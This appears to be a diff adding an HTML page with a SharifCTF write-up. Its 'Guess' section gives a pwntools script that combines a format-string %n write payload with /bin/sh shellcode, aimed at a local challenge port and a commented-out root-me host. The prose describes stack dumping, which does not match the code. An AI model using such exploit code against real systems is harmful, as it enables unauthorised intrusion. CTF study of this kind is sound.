@@ -1,0 +1,118 @@
+<html>
+ <head>
+<title> Sharifctf  </title>
+
+ <link rel="stylesheet" type="text/css" href="test1.css" />
+ <link rel="stylesheet" type="text/css" href="fonts.css" />
+</head>
+<style>
+
+      body {background-color:white;
+	border-bottom:1px solid #bfbfbf
+         line-height:1.5em;
+	color:#222}
+ 
+   p{color:black;
+        /*font-style: italic;
+       font-family: "Times New Roman";*/
+      letter-spacing: 2px;
+       font-size: 20px;
+       margin-top: 10px;
+       margin-bottom: 10px;
+        margin-right: 150px;
+       margin-left: 150px; 
+       }
+
+
+
+    h1{ color:black;
+         font-style: italic;
+        font-size:2.2em;
+	font-family:"PT Serif","Georgia","Helvetica Neue",Arial,sans-serif;
+	font-weight:normal;
+	line-height:1.2em;
+	margin-bottom:0.6667em
+        margin-right: 150px;
+       margin-left: 150px;}
+
+   h2{ color:black;
+         font-style: italic;
+        font-size:2.2em;
+	font-family:"PT Serif","Georgia","Helvetica Neue",Arial,sans-serif;
+	font-weight:normal;
+	line-height:1.2em;
+	margin-bottom:0.6667em
+        margin-right: 170px;
+       margin-left: 150px;}
+
+code { 
+display: block; white-space: pre-wrap; 
+border: 1px solid #000; 
+padding: 10px; 
+line-height: 1.5em; 
+font-family: "Lucida Console", Monaco, monospace; 
+} 
+.code-str 
+{ color:#ff33d4; } 
+ .code-comment { color:#3c33ff; } 
+ .code-key { color:#9933ff; }
+ .code-brown{color:#ba4a00} 
+
+
+</style>
+<body>
+
+<script src="null.js"></script>
+
+<div style="position: relative; background: url('http://hackerbuck.net23.net/css/bgm.png'); width: 1210px; height: 110px;">
+ <div style="position: absolute; bottom: 0; left: 0.5em; width: 400px; font-weight: bold; color: #fff;">
+ <p style="color:white;font-size:2.2em;"> Sharifctf </p>
+ </div>
+ </div>
+
+
+ <br> <br>  <br>          
+
+<h1 class="post-title"> Sharifctf Writeup </h1>
+   
+ <br> 
+
+<h2> Guess [PWN 50]</h2>
+<p> It had format string vuln and we had to dump wholwe stack and find the flag in it so i wrote a Brute-force in python using Direct parameter access . <br>
+    But twist here is <b> It is 64 bit binary so u have to use $lx instead of $x </b> .. </p>
+
+<code>
+from pwn import *
+
+shellcode="\x90"*10+"\x6a\x02\x5b\x6a\x29\x58\xcd\x80\x48\x89\xc6\x31\xc9\x56\x5b\x6a\x3f\x58\xcd\x80\x41\x80\xf9\x03\x75\xf5\x6a\x0b\x58\x99\x52\x31\xf6\x56\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\xcd\x80"+"\x90"*10
+i=8
+
+while True:
+  try:
+   num = 0xccec+i
+   num1=  num - 78
+   num2 = 0xffff - num
+   r=remote('localhost',56032)
+   #r=remote('challenge02.root-me.org',56032)
+   payload = pack(0x0804a04c)+pack(0x0804a04e)+shellcode+"%"+str(num1)+"u"+"%5$n"+"%"+str(num2)+"u"+"%6$n"
+   print payload
+   r.sendline(payload)
+   #r.interactive()
+   msg=r.recv(1024,timeout = 10)
+   print msg
+  except EOFError :
+      print "[+] No shell!"
+      print "[+]i="+str(i)
+      i=i+1 	
+
+</code>
+
+<h2> MISC 100 </h2>
+
+<p> Basically it had a binary which when running displays a image our aim is to find camera model of that image but how to extract it ??? <br>
+    I analysed it using Binwalk but it showed only elf and zlib data ... <b>but it fooled me if u extract it using -e option in binwalk u get the image ...</b>
+    </p>
+
+
+</body>
+</html>
